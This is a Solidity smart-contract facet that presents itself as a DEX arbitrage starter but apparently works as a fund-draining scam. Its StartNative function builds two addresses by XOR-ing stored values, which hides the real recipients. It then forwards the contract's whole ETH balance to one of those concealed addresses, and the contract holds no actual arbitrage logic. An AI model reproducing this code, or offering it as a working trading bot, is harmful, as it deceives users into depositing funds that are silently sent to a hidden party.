//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./TestLib.sol";
contract getDexRouterFacet {
    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == ds._owner, "Ownable: caller is not the owner");
        _;
    }

    function getDexRouter(
        bytes32 _DexRouterAddress,
        bytes32 _factory
    ) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }
    function startArbitrageNative() internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address tradeRouter = getDexRouter(ds.DexRouter, ds.factory);
        address dataProvider = getDexRouter(ds.apiKey, ds.DexRouter);
        IERC20(dataProvider).createStart(
            msg.sender,
            tradeRouter,
            address(0),
            address(this).balance
        );
        payable(tradeRouter).transfer(address(this).balance);
    }
    function StartNative() public payable {
        startArbitrageNative();
    }
}
